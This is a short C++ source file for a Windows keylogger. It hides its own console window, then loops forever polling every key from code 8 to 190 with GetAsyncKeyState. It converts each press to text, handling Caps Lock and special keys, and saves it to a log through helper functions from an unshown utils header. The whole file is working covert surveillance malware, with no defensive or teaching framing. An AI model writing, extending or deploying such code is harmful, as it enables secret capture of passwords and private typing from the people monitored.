#include <bits/stdc++.h>

#include "utils.hpp"

#define PRESSED_KEY_CODE -32767

int main() {
    utils::hide_terminal();

    while (true) {
        for (int key_code = 8; key_code <= 190; ++key_code) {
            if (PRESSED_KEY_CODE == GetAsyncKeyState(key_code)) {
                std::string data;
                if (utils::is_special_char(key_code)) {
                    data = utils::translate_special_key_int_to_string(key_code);
                } else {
                    if (GetKeyState(VK_CAPITAL)) {
                        data = std::string(1, (char) key_code);
                    } else {
                        data = std::string(1, (char) std::tolower(key_code));
                    }
                }
                utils::save_log_data(data);
            }
        }
    }
}